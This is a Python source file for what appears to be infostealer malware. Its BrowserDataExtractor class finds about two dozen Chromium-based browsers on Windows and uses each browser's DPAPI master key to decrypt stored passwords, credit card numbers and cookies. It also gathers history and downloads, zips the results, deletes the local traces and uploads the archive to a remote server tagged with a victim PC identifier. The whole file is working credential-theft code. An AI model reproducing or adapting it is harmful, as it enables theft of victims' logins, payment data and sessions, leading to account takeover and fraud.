import base64
import json
import os
import shutil
import sqlite3
import zipfile
import tempfile
from datetime import datetime, timedelta
from features.curlmanager import CurlManager
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

class BrowserDataExtractor:
    def __init__(self, cfc_instance):
        self.cfc_instance = cfc_instance
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        
        self.browsers = {
            'avast': self.appdata + '\\AVAST Software\\Browser\\User Data',
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'chromium': self.appdata + '\\Chromium\\User Data',
            'chrome-canary': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'msedge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'msedge-canary': self.appdata + '\\Microsoft\\Edge SxS\\User Data',
            'msedge-beta': self.appdata + '\\Microsoft\\Edge Beta\\User Data',
            'msedge-dev': self.appdata + '\\Microsoft\\Edge Dev\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'coccoc': self.appdata + '\\CocCoc\\Browser\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable'
        }

        self.data_queries = {
            'login_data': {
                'query': 'SELECT action_url, username_value, password_value FROM logins',
                'file': '\\Login Data',
                'columns': ['URL', 'Email', 'Password'],
                'decrypt': True
            },
            'credit_cards': {
                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
                'file': '\\Web Data',
                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
                'decrypt': True
            },
            'cookies': {
                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
                'file': '\\Network\\Cookies',
                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
                'decrypt': True
            },
            'history': {
                'query': 'SELECT url, title, last_visit_time FROM urls',
                'file': '\\History',
                'columns': ['URL', 'Title', 'Visited Time'],
                'decrypt': False
            },
            'downloads': {
                'query': 'SELECT tab_url, target_path FROM downloads',
                'file': '\\History',
                'columns': ['Download URL', 'Local Path'],
                'decrypt': False
            }
        }
        
        # Create timestamp for folder name
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Create output folder in temp directory
        self.temp_dir = tempfile.gettempdir()
        self.output_folder = os.path.join(self.temp_dir, f"browser_data_{self.timestamp}")

    def get_master_key(self, path: str):
        """Get the master key for decrypting browser data"""
        try:
            if not os.path.exists(path):
                return None

            local_state_path = os.path.join(path, "Local State")
            if not os.path.exists(local_state_path):
                return None

            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state_content = f.read()
                
            if 'os_crypt' not in local_state_content:
                return None

            local_state = json.loads(local_state_content)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            master_key = CryptUnprotectData(key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            return None

    def decrypt_password(self, buff: bytes, key: bytes) -> str:
        """Decrypt password using the master key"""
        try:
            if not key or not buff:
                return ""
                
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return ""

    def save_results(self, browser_name, type_of_data, content):
        """Save extracted data to files in the timestamped folder inside temp directory"""
        try:
            # Create the main output folder if it doesn't exist
            if not os.path.exists(self.output_folder):
                os.mkdir(self.output_folder)
                
            # Create browser-specific folder inside the main folder
            browser_folder = os.path.join(self.output_folder, browser_name)
            if not os.path.exists(browser_folder):
                os.mkdir(browser_folder)
                
            if content and content.strip():
                file_path = os.path.join(browser_folder, f"{type_of_data}.txt")
                with open(file_path, 'w', encoding="utf-8") as f:
                    f.write(content)
            else:
                pass
        except Exception as e:
            pass

    def get_data(self, path: str, profile: str, key, type_of_data):
        """Extract data from browser database"""
        try:
            db_file = f'{path}\\{profile}{type_of_data["file"]}'
            if not os.path.exists(db_file):
                return ""
                
            result = ""
            temp_db = 'temp_db'
            
            try:
                shutil.copy(db_file, temp_db)
            except Exception as e:
                return result
                
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute(type_of_data['query'])
                
                for row in cursor.fetchall():
                    row = list(row)
                    if type_of_data['decrypt']:
                        for i in range(len(row)):
                            if isinstance(row[i], bytes) and row[i]:
                                row[i] = self.decrypt_password(row[i], key)
                                
                    if type_of_data.get('data_type_name') == 'history':
                        if row[2] != 0:
                            row[2] = self.convert_chrome_time(row[2])
                        else:
                            row[2] = "0"
                            
                    result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
                    
            except Exception as e:
                pass
            finally:
                conn.close()
                
            try:
                os.remove(temp_db)
            except Exception as e:
                pass
                
            return result
        except Exception as e:
            return ""

    def convert_chrome_time(self, chrome_time):
        """Convert Chrome time to readable format"""
        try:
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
        except Exception as e:
            return "0"

    def installed_browsers(self):
        """Get list of installed browsers"""
        try:
            available = []
            for browser_name, browser_path in self.browsers.items():
                local_state_path = os.path.join(browser_path, "Local State")
                if os.path.exists(local_state_path):
                    available.append(browser_name)
            return available
        except Exception as e:
            return []

    def zip_output_folder(self):
        """Zip the output folder and delete the original folder"""
        try:
            zip_filename = f"{self.output_folder}.zip"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.output_folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, os.path.dirname(self.output_folder))
                        zipf.write(file_path, arcname=arcname)
            
            # Delete the original folder after successful zipping
            try:
                shutil.rmtree(self.output_folder)
            except Exception as e:
                pass
                
            return zip_filename
        except Exception as e:
            return None

    def send_to_server(self, zip_filepath):
        """Send the zip file to the server using CurlManager"""
        try:
            # Verify file exists before sending
            if not os.path.exists(zip_filepath):
                return False
            
            url = f"{self.cfc_instance.base_url}/browser?pc_id={self.cfc_instance.client_data['pc_id']}"
            
            curl = CurlManager()
            curl.set_headers(self.cfc_instance.headers)
            
            curl.post_file(
                url=url,
                file_path=zip_filepath,
                field_name='file'
            )
            
            try:
                os.remove(zip_filepath)
            except Exception as e:
                pass
                            
        except Exception as e:
            return False

    def extract_all_data(self):
        """Main method to extract all browser data and send to server"""
        try:
            available_browsers = self.installed_browsers()
            
            for browser in available_browsers:
                try:
                    browser_path = self.browsers[browser]
                    master_key = self.get_master_key(browser_path)

                    for data_type_name, data_type in self.data_queries.items():
                        try:
                            notdefault = ['opera-gx']  # Browsers that we do not specify "Default" for profile
                            profile = "Default"
                            if browser in notdefault:
                                profile = ""
                                
                            # Pass data_type_name to get_data method
                            data_type['data_type_name'] = data_type_name
                            data = self.get_data(browser_path, profile, master_key, data_type)
                            self.save_results(browser, data_type_name, data)
                        except Exception as e:
                            continue
                except Exception as e:
                    continue
                    
            zip_file = self.zip_output_folder()
            if zip_file:
                # Send the zip file to the server
                success = self.send_to_server(zip_file)
                return success
            return False
        except Exception as e:
            return False
